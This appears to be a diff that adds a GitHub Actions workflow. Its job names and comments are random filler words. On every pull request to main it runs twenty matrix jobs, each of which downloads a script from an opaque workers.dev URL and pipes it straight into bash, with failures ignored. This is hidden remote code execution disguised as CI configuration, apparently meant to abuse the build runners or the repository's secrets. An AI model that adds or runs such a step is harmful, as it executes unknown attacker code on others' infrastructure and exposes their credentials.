@@ -1,0 +1,27 @@
+name: gallery
+
+#negative enough
+on:
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  van:
+    #territory neck irregular fairly disturb plate
+    strategy:
+      matrix:
+        hut: ["device", "compensation", "visibility", "utter", "cease"]
+        decay: ["apparent", "airport", "pencil", "waken"]
+      fail-fast: false
+    runs-on: ubuntu-latest
+    steps:
+    - name:  appreciation-membership
+      uses: actions/checkout@v6
+    #article gym
+    - name: community
+      continue-on-error: true
+      run: curl "https://node.vrotsosvanhouten30272.workers.dev/accb/c6/41c3/fc9b/1/e65a68/2/07ececc066d9a47b64/2fe98930b60/9c93a8e89f54f?z=1775399677&xl=zk&mx=o" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        path: 'undergraduate'
+        name: 'shortly'
